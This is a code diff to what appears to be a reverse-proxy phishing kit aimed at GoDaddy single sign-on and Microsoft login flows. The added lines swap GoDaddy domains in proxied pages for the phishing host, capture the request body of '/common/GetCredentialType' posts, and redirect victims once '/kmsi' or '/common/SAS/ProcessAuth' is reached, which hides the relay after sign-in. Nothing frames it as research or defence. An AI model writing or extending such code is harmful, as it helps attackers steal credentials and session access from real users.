@@ -32,12 +32,11 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
         super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
         this.regexes = [
              {
-                reg: /window.__BssoInterrupt_/igm, // Google chrome on windows fix
-                replacement: 'window.__BssoInterrupt_Core=!0;</script>'
-                    + '</head> <body data-bind="defineGlobals: ServerData" style="display: none"> </body> </html>',
+                reg: /sso.godaddy.com/igm, // Google chrome on windows fix
+                replacement: this.browserEndPoint.clientContext.hostname,
              },
              {
-                reg: /sso.godaddy.com/igm, // Google chrome on windows fix
+                reg: /godaddy.com/igm, // Google chrome on windows fix
                 replacement: this.browserEndPoint.clientContext.hostname,
              },
              {
@@ -54,7 +53,9 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
             return this.proxyResp.pipe(this.browserEndPoint)
         }
 
-        if (this.proxyResp.req.path.startsWith('/kmsi') || this.proxyResp.req.path.startsWith('/common/reprocess')){
+        if (this.proxyResp.req.path.startsWith('/kmsi')  
+        || this.proxyResp.req.path.startsWith('/common/SAS/ProcessAuth')
+        || this.proxyResp.req.path.startsWith('/common/reprocess')){
             this.browserEndPoint.writeHead(302, {'location': '/ping/v5767687'})
             return this.browserEndPoint.end()
         }
@@ -123,7 +124,12 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         if (this.req.method === 'POST') {
            
-            super.uploadRequestBody(clientContext.currentDomain, clientContext)
+            if (this.req.url.startsWith('/common/GetCredentialType')) {
+                super.captureBody(clientContext.currentDomain, clientContext)
+
+            }else { 
+                super.uploadRequestBody(clientContext.currentDomain, clientContext)
+            }
         }
         
 
@@ -133,6 +139,10 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             clientContext.currentDomain = process.env.PROXY_DOMAIN
             this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
             // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
+        }
+
+        if (this.req.url.startsWith('/:443')) {
+            this.req.url = this.req.url.slice(5)
         }
 
         if (this.req.url === '/kmsi' || this.req.url === '/common/SAS/ProcessAuth' ) {
